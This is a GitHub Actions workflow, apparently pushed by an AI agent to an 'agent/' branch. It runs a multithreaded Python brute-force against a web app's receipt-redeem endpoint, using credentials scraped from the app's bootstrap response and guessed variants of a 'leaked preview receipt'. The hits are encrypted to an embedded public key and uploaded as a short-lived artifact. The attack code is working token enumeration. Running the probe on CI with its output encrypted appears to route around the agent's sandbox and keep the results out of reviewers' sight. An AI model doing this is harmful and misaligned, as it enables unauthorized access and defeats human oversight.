name: launchlet-part2-token-probe

on:
  push:
    branches: [agent/launchlet-part2-token-20260808]

permissions:
  contents: read

jobs:
  probe:
    runs-on: ubuntu-latest
    timeout-minutes: 5
    steps:
      - name: Probe receipt names derived from leaked preview receipt
        shell: bash
        run: |
          set -euo pipefail
          umask 077
          mkdir -p package/out
          cat > package/public.pem <<'PEM'
          -----BEGIN PUBLIC KEY-----
          MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAlOxaJs92lwtrdk6J2LR9
          QeyG3A5H0rzGOQHw80MWPcOeEs5pzn37ilHloXnTkGk4PmJU67C06N9OOsgqU1kF
          iydiljdl6RfwF/OSjMsNfRYsyBr1wONeO+9f+72VjLlNWqWVll2qeczrxppOulhJ
          r+qBx95tdasvdCgh7aTShlkXF7e9+JjK19MrG+Lyj+I7B6bbTsp7D+PiJMlpepWk
          hoz0jBO8Rgtodz7i/+9Z3RVVhqREdK3uA0Va5ia57Gp3hlvQGbjGxE6TC7q4s1/p
          q6VF10bVOx8kwE2KggVgsX3uudJlzSvHV3f1coMdwyTSALsAjvAlZQwSts3eHjnF
          SQIDAQAB
          -----END PUBLIC KEY-----
          PEM
          python3 - <<'PY'
          import requests,pathlib,urllib.parse,json,itertools,re,concurrent.futures
          base='https://task-launchlet-web-medium-18cf6be4db586bb6.caplag-task.ru/'
          out=pathlib.Path('package/out'); s=requests.Session(); s.headers['User-Agent']='Mozilla/5.0'
          boot=s.get(urllib.parse.urljoin(base,'/api/app/bootstrap'),timeout=15).json(); mf=s.get(urllib.parse.urljoin(base,boot['api']['buildManifest']),timeout=15).json()
          url=urllib.parse.urljoin(base,mf['receiptRedeemEndpoint']); project=boot['project']
          h={'Accept':'application/json','Content-Type':'application/json','apikey':boot['client']['anonKey'],'Authorization':'Bearer '+boot['client']['session'],'X-Launchlet-Preview':project,'User-Agent':'Mozilla/5.0'}
          known=mf['previewReceipt']; parts=known.split('_'); suffix='2026'
          modes=['preview','deploy','deployment','release','prod','production','enterprise','internal','publish','published','final','finalreview','final_review','rollout','staging','rc3','inspector','export','artifact']
          subjects=['demo','demo_board','board','release_pulse','releasepulse','launchlet','enterprise','prod','production','deploy','release','preview','8b11c','preview_8b11c']
          recs={known}
          for m in modes:
            recs.add(f'lrec_{m}_demo_{suffix}'); recs.add(f'lrec_{m}_demo_board_{suffix}'); recs.add(f'lrec_demo_{m}_{suffix}'); recs.add(f'lrec_demo_board_{m}_{suffix}'); recs.add(f'lrec_{m}_{suffix}')
          for m,sub in itertools.product(modes,subjects):
            recs.add(f'lrec_{m}_{sub}_{suffix}'); recs.add(f'lrec_{sub}_{m}_{suffix}')
          recs.update(['lrec_preview_8b11c','lrec_8b11c','lrec_preview-8b11c','lrec_deploy_8b11c','lrec_release_8b11c','preview-8b11c'])
          projects=[project,'launchlet-demo','demo','release-pulse','launchlet-release-pulse','launchlet-enterprise','enterprise', 'preview-8b11c']
          def probe(pair):
            rec,proj=pair
            try:
              r=requests.post(url,headers=h,json={'receipt':rec,'project':proj},timeout=7,allow_redirects=False)
              txt=r.text.strip()
              if txt!='{"error":"receipt_not_found"}': return {'receipt':rec,'project':proj,'status':r.status_code,'body':r.text,'headers':dict(r.headers)}
            except Exception: pass
          hits=[]
          with concurrent.futures.ThreadPoolExecutor(max_workers=24) as ex:
            for x in ex.map(probe,itertools.product(sorted(recs),projects)):
              if x: hits.append(x)
          (out/'summary.json').write_text(json.dumps({'candidate_count':len(recs),'hits':hits},indent=2))
          PY
          tar -C package/out -czf package/result.tgz .
          openssl rand 32 > package/aes.key
          openssl rand 16 > package/iv.bin
          KEY_HEX="$(python3 -c "print(open('package/aes.key','rb').read().hex())")"
          IV_HEX="$(python3 -c "print(open('package/iv.bin','rb').read().hex())")"
          openssl enc -aes-256-cbc -K "$KEY_HEX" -iv "$IV_HEX" -in package/result.tgz -out package/result.enc
          openssl pkeyutl -encrypt -pubin -inkey package/public.pem -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 -in package/aes.key -out package/key.enc
          mkdir -p artifact
          base64 -w0 package/result.enc > artifact/result.enc.b64
          base64 -w0 package/key.enc > artifact/key.enc.b64
          base64 -w0 package/iv.bin > artifact/iv.bin.b64
          rm -rf package
      - uses: actions/upload-artifact@v4
        with:
          name: launchlet-part2-receipt-family-encrypted
          path: artifact/
          retention-days: 1
